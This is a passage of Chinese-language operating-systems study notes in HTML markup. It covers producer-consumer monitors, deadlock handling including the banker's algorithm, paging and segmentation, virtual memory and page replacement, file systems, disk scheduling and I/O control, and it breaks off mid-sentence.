data-num=\"10\"></td><td><pre>            <span class=\"token function\">signal</span><span class=\"token punctuation\">(</span>empty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    Item <span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>count <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token function\">wait</span><span class=\"token punctuation\">(</span>empty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        count<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>count <span class=\"token operator\">==</span> N<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token function\">signal</span><span class=\"token punctuation\">(</span>full<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">remove_item</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    end monitor<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// 使用</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token function\">producer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        item <span class=\"token operator\">=</span> 生产一个产品<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        producerconsumer<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token function\">consumer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        item <span class=\"token operator\">=</span> producerconsumer<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        消费产品 item<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token number\">1234567891011121314151617181920212223242526272829303132333435</span></pre></td></tr></table></figure><p>拓展 2：Java 中类似于管程的机制</p>\n<p>java 中用 synchronized 来描述一个函数，这个函数同一时间只能被一个线程调用</p>\n<h3 id=\"24_1-死锁的概念\"><a class=\"markdownIt-Anchor\" href=\"#24_1-死锁的概念\">#</a> 2.4_1 死锁的概念</h3>\n<p>1、什么是死锁</p>\n<p>各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。</p>\n<p>2、进程死锁、饥饿、死循环的区别</p>\n<p>死锁：</p>\n<p>定义：各进程互相等待对方手里的资源，导致各进程都阻塞，无法向前推进的现象。</p>\n<p>区别：至少两个或两个的进程同时发生死锁</p>\n<p>饥饿：</p>\n<p>定义：由于长期得不到想要的资源，某进程无法向前推进的现象。</p>\n<p>区别：可能只有一个进程发生饥饿</p>\n<p>死循环：</p>\n<p>定义：某进程执行过程中一直跳不出某个循环的现象。</p>\n<p>区别：死循环是程序员的问题</p>\n<p>3、死锁产生的必要条件</p>\n<ul>\n<li>互斥条件：多个进程争夺资源发生死锁</li>\n<li>不剥夺条件：进程获得的资源不能由其它进程强行抢夺</li>\n<li>请求和保持条件：某个进程有了资源，还在请求资源</li>\n<li>循环等待条件：存在资源的循环等待链</li>\n</ul>\n<p>4、什么时候会发生死锁</p>\n<ul>\n<li>对系统资源的竞争</li>\n<li>进程推进顺序非法</li>\n<li>信号量的使用不当也会造成死锁</li>\n</ul>\n<p>5、死锁的处理策略</p>\n<ul>\n<li>预防死锁</li>\n<li>避免死锁</li>\n<li>死锁的检测和解除</li>\n</ul>\n<h3 id=\"24_2-死锁的处理策略预防死锁\"><a class=\"markdownIt-Anchor\" href=\"#24_2-死锁的处理策略预防死锁\">#</a> 2.4_2 死锁的处理策略 —— 预防死锁</h3>\n<p>1、不允许死锁发生</p>\n<ul>\n<li>静态策略：预防死锁\n<ul>\n<li>破坏互斥条件（有些不能破坏）<br>\n把互斥的资源改造为共享资源</li>\n<li>破坏不剥夺条件（复杂，造成之前工作失效，降低系统开销，会全部放弃、导致饥饿）<br>\n方案 1：当请求得不到满足的时候，立即释放手里的资源<br>\n方案 2：由系统介入，强行帮助剥夺</li>\n<li>破坏请求和保持条件（资源利用率极低，可能会导致某些进程饥饿）<br>\n采用静态分配方法，一次性全部申请，如果申请不到，不要允许</li>\n<li>破坏循环等待条件（不方便增加新的设备，实际使用与递增顺序不一致，会导致资源的浪费，必须按规定次序申请资源）<br>\n顺序资源分配法：对资源编号，进程按编号递增顺序请求资源</li>\n</ul>\n</li>\n<li>动态检测：避免死锁</li>\n</ul>\n<p>2、允许死锁发生</p>\n<ul>\n<li>死锁的检测和解除</li>\n</ul>\n<h3 id=\"24_3-死锁的处理策略避免死锁\"><a class=\"markdownIt-Anchor\" href=\"#24_3-死锁的处理策略避免死锁\">#</a> 2.4_3 死锁的处理策略 —— 避免死锁</h3>\n<p>动态检测：避免死锁</p>\n<ul>\n<li>\n<p>什么是安全序列</p>\n<p>进行后面的某些情况，不会使系统发生死锁</p>\n</li>\n<li>\n<p>什么是系统的不安全状态，与死锁有何联系<br>\n如果系统处于安全状态，就一定不会发生死锁。如果系统进入不安全状态，就可能发生死锁（处于不安全状态未必就是发生了死锁，但发生死锁时一定时在不安全状态）</p>\n</li>\n<li>\n<p>如何避免系统进入不安全状态 —— 银行家算法</p>\n<p>初始分配完成后，优先全部分配给最少的，并且拿回资源</p>\n</li>\n</ul>\n<p>步骤：</p>\n<p>1、检查此次申请是否超过了之前声明的最大需求数</p>\n<p>2、检查此时系统剩余的可用资源是否还能满足这次请求</p>\n<p>3、试探着分配，更改各数据结构</p>\n<p>4、用安全性算法检查此次所分配是否会导致系统进入不安全状态</p>\n<h3 id=\"24_4-死锁的处理策略检测和解除\"><a class=\"markdownIt-Anchor\" href=\"#24_4-死锁的处理策略检测和解除\">#</a> 2.4_4 死锁的处理策略 —— 检测和解除</h3>\n<p>死锁的检测</p>\n<p>1、用某种数据结构来保存资源的请求和分配信息</p>\n<p>2、提供一种算法，利用上述信息来检测系统是否已进入死锁状态</p>\n<p>死锁的解除</p>\n<p>1、资源剥夺法：挂起某些死锁进程，并抢占它的资源，将这些资源分配给其他的死锁进程。</p>\n<p>2、撤销进程法：强制撤销部分，甚至全部死锁进程，并剥夺这些进程的资源。</p>\n<p>3、进程回退法：让一个或多个死锁进程回退到足以避免死锁的地步。</p>\n<h3 id=\"31_1-内存的基础知识\"><a class=\"markdownIt-Anchor\" href=\"#31_1-内存的基础知识\">#</a> 3.1_1 内存的基础知识</h3>\n<p>1、什么是内存</p>\n<p>存储单元：每个地址对应一个存储单元</p>\n<p>内存地址：</p>\n<p>2、进程运行的基本原理</p>\n<p>指令的工作原理：</p>\n<p>逻辑地址 vs 物理地址：逻辑地址就是相对地址</p>\n<p>从写程序到程序运行：编辑 - 编译 - 链接 - 装入</p>\n<p>三种链接方式：静态链接（在程序运行前，先将各目标模块及它们所需的库函数连接成一个完整的可执行文件）、装入时动态链接（将各目标模块装入内存时，边装入边链接的链接方式）、运行时动态链接（在程序执行中需要该模块时，才对它进行链接，其优点时便于修改和更新。）</p>\n<p>三种装入方式：绝对装入（在编译的时候就知道程序放在内存的哪个位置）、静态重定位（装入时将逻辑地址转表为物理地址）、动态重定位（把地址转化推迟到程序真正要执行时才进行）</p>\n<h3 id=\"31_2-内存管理的概念\"><a class=\"markdownIt-Anchor\" href=\"#31_2-内存管理的概念\">#</a> 3.1_2 内存管理的概念</h3>\n<p>1、内存空间的分配与回收</p>\n<p>2、内存空间的扩充</p>\n<p>内存的虚拟性</p>\n<p>3、地址转换</p>\n<p>逻辑地址和物理地址转换</p>\n<p>4、存储保护</p>\n<ul>\n<li>设置上下限寄存器</li>\n<li>采用重定位寄存器（基址寄存器）和界地址寄存器（限长寄存器）</li>\n</ul>\n<h3 id=\"31_3-覆盖与交换\"><a class=\"markdownIt-Anchor\" href=\"#31_3-覆盖与交换\">#</a> 3.1_3 覆盖与交换</h3>\n<p>内存空间的扩充</p>\n<p>覆盖技术：将程序分为多个段，内存分为” 固定区 “和” 覆盖区 “，需要常驻的放在” 固定区 “，调入后就不再调出，不常用的段放在” 覆盖区 “，需要用到时调入内存，用不到时掉出内存</p>\n<p>交换技术：内存空间紧张时，系统将内存中某些进程暂时换出外存，把外存中某些已具备运行条件的进程换入内存（PCB 会常驻内存，不会被患处）</p>\n<p>虚拟存储技术：</p>\n<h3 id=\"31_4-连续分配管理方式\"><a class=\"markdownIt-Anchor\" href=\"#31_4-连续分配管理方式\">#</a> 3.1_4 连续分配管理方式</h3>\n<p>连续分配方式</p>\n<p>单一连续分配：内存被分配为系统区和用户区，系统区在低地址，用户区是一个用户独享</p>\n<p>固定分区分配：将用户区分割为若干固定分区给各道程序，分割策略有分区大小相等和分区大小不相等，可以建议一个分区说明表来管理各个分区</p>\n<p>动态分区分配：可变分区分配，不会预先划分内存分区，而是在进程装入内存时，根据进程的大小动态地建立分区，并使分区的大小正好适合进程的需要。</p>\n<p>内部碎片：分配给某进程的内存区域中，如果有些部分没有用上</p>\n<p>外部碎片：是指内存中的某些空闲分区由于太小而难以利用（如果有外部碎片，可以采用紧凑技术）</p>\n<h3 id=\"31_5-动态分区分配算法\"><a class=\"markdownIt-Anchor\" href=\"#31_5-动态分区分配算法\">#</a> 3.1_5 动态分区分配算法</h3>\n<p>1、首次适应算法（First Fit)</p>\n<p>算法思想：每次从低地址开始查找，找到第一个能满足大小的空闲分区</p>\n<p>2、最佳适应算法 (Best Fit)</p>\n<p>算法思想：为了保证 “大进程” 到来时能有连续的大片区域，可以尽可能留下大片的空闲区，优先使用更小的空闲区。</p>\n<p>空闲分区按容量递增次序链接，分配内存时顺序查找空闲分区链</p>\n<p>缺点：会留下小碎片</p>\n<p>3、最坏适应算法 (Worst Fit)</p>\n<p>算法思想：和最佳适应算法相反，按容量递减次序排列，每次尽可能用大的分区</p>\n<p>4、领近适应算法 (Next Fit)</p>\n<p>算法思想：每次从上次查找结束的位置开始检索</p>\n<p>缺点：大空间容易被用完</p>\n<h3 id=\"31_6-基本分页存储管理的基本概念\"><a class=\"markdownIt-Anchor\" href=\"#31_6-基本分页存储管理的基本概念\">#</a> 3.1_6 基本分页存储管理的基本概念</h3>\n<p>允许一个进程分散地装入道许多不相邻的位置</p>\n<p>连续分配：为用户进程分配连续的内存空间</p>\n<p>非连续分配：为用户进程分配分散的内存空间</p>\n<p>将内存分为大小相等的小分区 “页框”，将用户的进程空间也分为大小相等的一个个区域，以页框的基本单位分配给每个进程片</p>\n<p>分页管理：物理地址 = 页面的其实位置 + 偏移量</p>\n<p>计算机中用 2 的整数倍表示页面的大小</p>\n<p>页表：存放页号和块号的对应关系</p>\n<h3 id=\"31_7-基本地址变换机构\"><a class=\"markdownIt-Anchor\" href=\"#31_7-基本地址变换机构\">#</a> 3.1_7 基本地址变换机构</h3>\n<p>页表寄存器（PTR），存放页表在内存中的起始地址 F 和页表长度 M，进程未执行时，页表的起始地址和页表的长度放在进程控制块（PCB）中，当进程被调度时，操作系统内核会把它们放在页表寄存器中。</p>\n<h3 id=\"31_8-具有快表的地址变换机构\"><a class=\"markdownIt-Anchor\" href=\"#31_8-具有快表的地址变换机构\">#</a> 3.1_8 具有快表的地址变换机构</h3>\n<p>1、局部性原理</p>\n<p>时间局部性：访问某个变量后，在不久的将来还会被访问</p>\n<p>空间局部性：程序访问了某个存储单元，不久之后，其附近的存储单元也很有可能被访问</p>\n<p>2、什么是快表（TLB）</p>\n<p>快表：又称联想寄存器（TLB），是一种访问速度比内存快很多的高速缓冲存储器，用来存放当前访问的若干页表项，以加速地址变换的过程。与此对应，内存中的页表常称为慢表。</p>\n<p>3、引入快表后，地址的变换过程</p>\n<h3 id=\"31_9-两级页表\"><a class=\"markdownIt-Anchor\" href=\"#31_9-两级页表\">#</a> 3.1_9 两级页表</h3>\n<p>1、单级页表存在什么问题？如何解决？</p>\n<p>所有页表项必须连续存放，页表过大时需要很大的连续空间</p>\n<p>在一段时间内并非所有页面都用得到，因此没必要让整个页表常驻内存</p>\n<p>2、两级页表的原理、逻辑地址结构</p>\n<p>将长长的页表再分页</p>\n<p>逻辑地址结构：（一级页号、二级页号、页内偏移量）</p>\n<p>页目录表、外层页表、顶级页表</p>\n<p>3、如何实现地址变换？</p>\n<p>按照地址结构将逻辑地址拆分成三部分</p>\n<p>从 PCB 中读出页目录表始址，根据一级页号查页目录表，找到下一级页表在内存中的存放位置</p>\n<p>根据二级页号查表，找到最终想访问的内存块号</p>\n<p>结合页内偏移量得到物理地址</p>\n<p>4、两级页表问题需要注意的几个细节</p>\n<p>多级页表中，各级页表的大小不能超过一个页面。若两级页表不够，可以分更多级</p>\n<p>多级页表的访问次数（假设没有快表结构）——N 级页表访问一个逻辑地址需要 N+1 次访存</p>\n<h3 id=\"31_10-基本分段存储管理方式\"><a class=\"markdownIt-Anchor\" href=\"#31_10-基本分段存储管理方式\">#</a> 3.1_10 基本分段存储管理方式</h3>\n<p>1、什么是分段？</p>\n<p>进程的地址空间：按照程序自身的逻辑关系划分为若干个段，每段有段名，每段从 0 开始编址</p>\n<p>段号的位数决定了每个进程最多可以分几个段</p>\n<p>段内地址位数决定了每个段的最大长度是多少</p>\n<p>2、什么是段表</p>\n<p>段表：段映射表</p>\n<p>每个程序被分段后，用段表记录该程序在内存中存放的位置</p>\n<p>段表：段号 段长 基址</p>\n<p>3、如何实现地址变换</p>\n<p>4、分段、分页管理的对比</p>\n<p>页：信息的物理单位，实现离散分配，提高内存利用率，地址是一维的，访存两次</p>\n<p>段：信息的逻辑单位，对系统可见，地址是二维的，访存 3 次</p>\n<p>分段比分页更容易实现信息的共享和保护（不能被修改的代码称为纯代码和可重入代码，不属于临界资源）</p>\n<h3 id=\"31_11-段页式的管理方式\"><a class=\"markdownIt-Anchor\" href=\"#31_11-段页式的管理方式\">#</a> 3.1_11 段页式的管理方式</h3>\n<p>1、分页、分段管理方式最大的优缺点</p>\n<p>分页：利用率高，碎片少，不方便进行信息共享和保护</p>\n<p>分段：方便信息共享和保护，如果段长大，容易产生外部碎片</p>\n<p>2、分段 + 分页的结合 —— 段页式管理方式</p>\n<p>先分段再分页</p>\n<p>段号 + 页号 + 页内偏移量</p>\n<p>地址结构是二维的</p>\n<p>3、段表、页表</p>\n<p>4、如何实现地址变换</p>\n<h3 id=\"32_1-虚拟内存的基本概念\"><a class=\"markdownIt-Anchor\" href=\"#32_1-虚拟内存的基本概念\">#</a> 3.2_1 虚拟内存的基本概念</h3>\n<p>1、传统存储管理方式的特征、缺点</p>\n<p>之前讲的</p>\n<p>一次性：作业必须全部装入内存后才能开始运行，并发性下降</p>\n<p>驻留性：一旦作业被装入内存，就会一直驻留在内存</p>\n<p>2、局部性原理</p>\n<ul>\n<li>时间局部性</li>\n<li>空间局部性</li>\n<li>高速缓存技术</li>\n</ul>\n<p>3、虚拟内存的定义和特征</p>\n<p>虚拟内存最大容量是计算机地址结构确定的</p>\n<p>虚拟内存的实际容量 = min (内存和外存容量之和，CPU 寻址范围)</p>\n<p>eg：某计算机地址结构为 32 位，按字节编址，内存大小为 512MB，外存大小为 2DB.</p>\n<p>则虚拟内存的最大容量为 2^32B=4GB</p>\n<p>虚拟内存的实际容量 = min (2^32B,512MB+2GB)=2GB+512MB</p>\n<p>多次性：无需在作业运行时一次性全部装入内存，而是允许被分成多次调用内存</p>\n<p>对换性：在作业运行时无需一直常驻内存，而是允许在作业运行过程中，将作业换入换出</p>\n<p>虚拟性：从逻辑上扩充了内存的容量，使用户看到的内存容量，远大于实际的容量</p>\n<p>4、如何实现虚拟内存技术</p>\n<p>在程序执行过程中，当所访问的信息不再内存时，由操作系统负责将所需信息从外存调入内存，然后继续执行程序。</p>\n<p>若内存空间不够，由操作系统负责将内存中暂时用不到的信息换出到外存。</p>\n<h3 id=\"32_2-请求分页管理方式\"><a class=\"markdownIt-Anchor\" href=\"#32_2-请求分页管理方式\">#</a> 3.2_2 请求分页管理方式</h3>\n<p>1、页表机制</p>\n<p>请求分页存储的页表：</p>\n<p>内存块号 状态位 访问字段 修改位 外存地址</p>\n<p>2、缺页中断机构</p>\n<p>内中断，可被修复</p>\n<p>3、地址变换机构</p>\n<h3 id=\"32_3-页面置换算法\"><a class=\"markdownIt-Anchor\" href=\"#32_3-页面置换算法\">#</a> 3.2_3 页面置换算法</h3>\n<p>1、最佳置换算法（OPT）</p>\n<p>每次选择淘汰的页面是以后永不使用或者在最长时间内不再被访问的页面，这样可以保证最低的缺页率。</p>\n<p>实际上不知道后面的序列</p>\n<p>2、先进先出置换算法（FIFO）</p>\n<p>每次选择淘汰的页面是最早进入内存的页面</p>\n<p>Belady 异常，当分配的内存块增大时，缺页次数反而增加</p>\n<p>3、最近最久未使用置换算法（LRU）</p>\n<p>每次淘汰最近最久未使用的页面</p>\n<p>4、时钟置换算法（最近未用算法，CLOCK）</p>\n<p>简单的：最多经历两轮扫描，初始为 1，扫一下为 0，再扫一下被踢</p>\n<p>5、改进型的时钟置换算法</p>\n<p>优先淘汰没有被修改过的，因为没有修改过的不用进行 IO 操作 00-&gt;01（改）-&gt;00-&gt;01</p>\n<h3 id=\"32_4-页面分配策略\"><a class=\"markdownIt-Anchor\" href=\"#32_4-页面分配策略\">#</a> 3.2_4 页面分配策略</h3>\n<p>1、驻留集</p>\n<p>指请求分页存储管理中给进程分配的物理块的集合</p>\n<p>2、页面分配、置换策略</p>\n<ul>\n<li>固定分配局部替换：驻留集大小不可改变</li>\n<li>可变分配全局替换：可以将操作系统保留的空闲物理块分配给缺页进程</li>\n<li>可变分配局部替换：只能选进程自己的物理块置换</li>\n</ul>\n<p>3、调入页面的时机</p>\n<p>预调页策略：一次调用若干个相邻页面，运行前调入</p>\n<p>请求调页策略：运行时缺页再调入</p>\n<p>4、从何处调页</p>\n<p>对换区：快，采用连续分配方式</p>\n<p>文件区：慢，采用离散分配方式</p>\n<p>5、抖动（颠簸）现象</p>\n<p>刚刚换出的又要换入，刚刚换入的又要换出，物理块不够</p>\n<p>6、工作集</p>\n<p>指在某段时间间隔里，进程实际访问页面的集合</p>\n<h3 id=\"41_1-初识文件管理\"><a class=\"markdownIt-Anchor\" href=\"#41_1-初识文件管理\">#</a> 4.1_1 初识文件管理</h3>\n<p>提供的功能：</p>\n<p>处理机管理</p>\n<p>存储器管理</p>\n<p>文件管理</p>\n<p>设备管理</p>\n<p>目标：安全高效</p>\n<h3 id=\"41_2-文件的逻辑结构\"><a class=\"markdownIt-Anchor\" href=\"#41_2-文件的逻辑结构\">#</a> 4.1_2 文件的逻辑结构</h3>\n<p>1、无结构文件</p>\n<p>文件由一系列二进制文件流组成</p>\n<p>2、有结构文件（记录式文件）</p>\n<p>顺序文件：文件中的记录一个接一个顺序排列，定长或变长，可以顺序存储或者链式存储</p>\n<p>按照是否与关键字顺序有关，可以分为串结构和顺序结构</p>\n<p>链式：无法随机存取</p>\n<p>顺序存储：</p>\n<ul>\n<li>可变长：无法随机存取</li>\n<li>定长：可以随机存取，采用串结构，无法快速找到关键字；采用顺序结构，可以快速查找关键字</li>\n</ul>\n<p>索引文件：索引表本身是定长的顺序文件</p>\n<p>索引顺序文件：多级索引表嵌套查找</p>\n<h3 id=\"41_3-文件目录\"><a class=\"markdownIt-Anchor\" href=\"#41_3-文件目录\">#</a> 4.1_3 文件目录</h3>\n<p>1、文件控制块（FCB）</p>\n<p>搜索、创建文件、删除文件、显示目录、修改目录</p>\n<p>2、目录结构</p>\n<ul>\n<li>单级目录结构</li>\n<li>两级目录结构</li>\n</ul>\n<p>主文件目录（MFD）+ 用户文件目录（UFD）</p>\n<ul>\n<li>多级目录结构（树形目录结构）</li>\n</ul>\n<p>当代操作系统采用方法、不便于文件共享</p>\n<ul>\n<li>\n<p>无环图目录结构</p>\n<p>可以共享</p>\n</li>\n</ul>\n<p>3、索引节点（对文件控制块</p>\n<p>压缩文件名和信息</p>\n<h3 id=\"41_4-文件的物理结构文件分配方式\"><a class=\"markdownIt-Anchor\" href=\"#41_4-文件的物理结构文件分配方式\">#</a> 4.1_4 文件的物理结构（文件分配方式）</h3>\n<p>1、对非空闲磁盘块的管理</p>\n<p>连续分配：连续分配方式要求每个文件在磁盘上占有一组连续的块，对文件的拓展不方便，有很多磁盘碎片</p>\n<p>链接分配</p>\n<ul>\n<li>隐式分配：采用链接分配方式的文件，只支持顺序访问，不支持随机访问，方便拓展</li>\n<li>显示分配：文件分配表显式记录下一块物理块的位置，方便拓展，支持随机访问，文件表会占内存空间</li>\n</ul>\n<h3 id=\"41_4-文件的物理结构文件分配方式-2\"><a class=\"markdownIt-Anchor\" href=\"#41_4-文件的物理结构文件分配方式-2\">#</a> 4.1_4 文件的物理结构（文件分配方式）</h3>\n<p>索引分配</p>\n<p>索引分配允许文件离散地分配在各个磁盘块中，系统会为每个文件建立一张索引表，索引表记录了文件的各个逻辑块对应的物理块</p>\n<p>支持随机访问</p>\n<ul>\n<li>链接方案</li>\n<li>多层索引</li>\n<li>混合索引</li>\n</ul>\n<h3 id=\"41_5-文件存储空间管理\"><a class=\"markdownIt-Anchor\" href=\"#41_5-文件存储空间管理\">#</a> 4.1_5 文件存储空间管理</h3>\n<p>1、存储空间的划分与初始化</p>\n<ul>\n<li>文件卷（逻辑卷）的概念</li>\n<li>目录区与文件区</li>\n</ul>\n<p>2、几种管理方法</p>\n<ul>\n<li>空闲表法：首位置 + 长度，回收时注意修改</li>\n<li>空闲链表法（空闲盘块链、空闲盘区链）</li>\n<li>位示图法</li>\n<li>成组链接法：文件卷的目录区中专门用一个磁盘块作为超级块，当系统启动时需要将超级内存块读入内存。并且保证内存与外存中的超级块数据一致。</li>\n</ul>\n<h3 id=\"41_6-文件的基本操作\"><a class=\"markdownIt-Anchor\" href=\"#41_6-文件的基本操作\">#</a> 4.1_6 文件的基本操作</h3>\n<p>创建文件（create）</p>\n<p>1、在外存中找到文件所需的空间</p>\n<p>2、创建该文件对应的目录项</p>\n<p>删除文件 (delete)</p>\n<p>1、找到文件名对应的目录项</p>\n<p>2、回收文件占用的磁盘块</p>\n<p>3、删除文件对应的目录项</p>\n<p>读文件 (read)</p>\n<p>写文件 (write)</p>\n<p>打开文件 (open)</p>\n<p>1、找到文件名对应的目录项</p>\n<p>2、将目录项复制到内存中的 “打开文件” 中</p>\n<p>关闭文件 (close)</p>\n<h3 id=\"41_7-文件共享\"><a class=\"markdownIt-Anchor\" href=\"#41_7-文件共享\">#</a> 4.1_7 文件共享</h3>\n<p>1、基于索引结点的共享方式（硬链接）</p>\n<p>直接指向文件的索引节点</p>\n<p>2、基于符号链的共享方式（软链接）</p>\n<p>相当于 win 的快捷方式</p>\n<h3 id=\"41_8-文件保护\"><a class=\"markdownIt-Anchor\" href=\"#41_8-文件保护\">#</a> 4.1_8 文件保护</h3>\n<p>1、口令保护</p>\n<p>2、加密保护</p>\n<p>保密性强，不需要在系统中存储 “密码”</p>\n<p>编码 / 译码，需要花费一定时间</p>\n<p>3、访问控制<br>\n在每个文件的 FCB 中增加一个访问控制表（ACL），该表记录了各个用户可以对该文件执行哪些操作</p>\n<h3 id=\"41_9-文件系统的层次结构\"><a class=\"markdownIt-Anchor\" href=\"#41_9-文件系统的层次结构\">#</a> 4.1_9 文件系统的层次结构</h3>\n<p>用户 / 应用接口</p>\n<p>用户接口</p>\n<p>文件目录系统</p>\n<p>存取控制模块</p>\n<p>逻辑文件系统与文件信息缓冲区</p>\n<p>物理文件系统</p>\n<p>辅助分配模块 设备管理模块</p>\n<p>设备</p>\n<h3 id=\"42_1-磁盘的结构\"><a class=\"markdownIt-Anchor\" href=\"#42_1-磁盘的结构\">#</a> 4.2_1 磁盘的结构</h3>\n<p>磁盘、磁道、扇区的概念</p>\n<p>如何在磁盘中读写数据</p>\n<p>盘面柱面的概念</p>\n<p>磁盘的物理地址</p>\n<p>磁盘的分类</p>\n<h3 id=\"42_2-磁盘调度算法\"><a class=\"markdownIt-Anchor\" href=\"#42_2-磁盘调度算法\">#</a> 4.2_2 磁盘调度算法</h3>\n<p>1、一次磁盘读 / 写操作需要的时间</p>\n<ul>\n<li>寻找时间 Ts=s+m*n</li>\n<li>延迟时间 Tr=1/(2r)</li>\n<li>传输时间 Tt=b/(rN)</li>\n</ul>\n<p>2、磁盘调度算法</p>\n<ul>\n<li>先来先服务（FCFS）</li>\n<li>最短寻找时间优先（SSTF）</li>\n</ul>\n<p>优先处理最近的磁道，可能会产生饥饿现象</p>\n<ul>\n<li>扫描算法（SCAN）</li>\n</ul>\n<p>只有磁头移动到最外侧磁道的时候才能往内移动，移动到最内侧磁道的时候才能往外移动</p>\n<p>LOOK，如果在磁头移动方向上已经没有别的请求，就可以立即改变磁头移动方向</p>\n<ul>\n<li>循环扫描算法（C-SCAN）</li>\n</ul>\n<p>返回时直接快速移动至起始端而不处理任何请求</p>\n<p>C-LOOK，如果在磁头移动方向上已经没有别的请求，就可以立即改变磁头移动方向</p>\n<h3 id=\"42_3-减小磁盘延迟时间的方法\"><a class=\"markdownIt-Anchor\" href=\"#42_3-减小磁盘延迟时间的方法\">#</a> 4.2_3 减小磁盘延迟时间的方法</h3>\n<p>1、寻找时间（寻道时间）：启动磁臂、移动磁头所花的时间</p>\n<p>2、延迟时间：将目标扇区转到磁头下面所化的时间</p>\n<p>磁头读取一块内容后，需要一小段的时间处理</p>\n<p>采用交替编号策略</p>\n<p>柱面号在盘面号之前，可以减少磁头移动消耗的时间</p>\n<p>错位命名</p>\n<p>3、传输时间：读 / 写 数据花费的时间</p>\n<h3 id=\"42_4-磁盘的管理\"><a class=\"markdownIt-Anchor\" href=\"#42_4-磁盘的管理\">#</a> 4.2_4 磁盘的管理</h3>\n<p>1、磁盘初始化</p>\n<p>低级格式化 / 物理分区</p>\n<p>2、引导块</p>\n<p>ROM 不可修改，ROM 中只存放很小的 “自举装入程序”</p>\n<p>3、坏块的管理</p>\n<p>在 FAT 表上标明（坏块对操作系统不透明）</p>\n<h3 id=\"51_1-i-o设备的概念和分类\"><a class=\"markdownIt-Anchor\" href=\"#51_1-i-o设备的概念和分类\">#</a> 5.1_1 I-O 设备的概念和分类</h3>\n<p>1、什么是 I-O 设备</p>\n<p>输入 / 输出</p>\n<p>2、按使用特性分类</p>\n<p>人机交互的外部设备</p>\n<p>存储设备</p>\n<p>网络通信设备</p>\n<p>3、按传输速率分类</p>\n<p>低俗设备、中速设备、高速设备</p>\n<p>4、按信息交换的单位分类</p>\n<p>块设备、字符设备</p>\n<h3 id=\"51_2-i-o控制器\"><a class=\"markdownIt-Anchor\" href=\"#51_2-i-o控制器\">#</a> 5.1_2 I-O 控制器</h3>\n<p>机械部件：鼠标等</p>\n<p>电子部件</p>\n<p>功能：</p>\n<p>1、接受和识别 CPU 发出的命令</p>\n<p>控制寄存器</p>\n<p>2、向 CPU 报告设备的状态</p>\n<p>状态寄存器</p>\n<p>3、数据交换</p>\n<p>数据寄存器</p>\n<p>4、地址识别</p>\n<p><img data-src=\"F:/Typora%E6%88%AA%E5%9B%BE/3fa359c8eb1eec40777b86bb0614bc4d.png\" alt=\"img\"></p>\n<p>内存映射 IO</p>\n<p>寄存器独立编制</p>\n<h3 id=\"51_3-i-o控制方式\"><a class=\"markdownIt-Anchor\" href=\"#51_3-i-o控制方式\">#</a> 5.1_3 I-O 控制方式</h3>\n<p>1、程序直接控制方式</p>\n<p>轮询：完成一次读 / 写操作的流程</p>\n<p>CPU 干预频繁</p>\n<p>每次读写一个字</p>\n<p>实现简单</p>\n<p>会使 CPU 忙等</p>\n<p>2、中断驱动方式</p>\n<p>让 cpu 发出 io 指令后做其它的事情</p>\n<p>大量中断会使 cpu 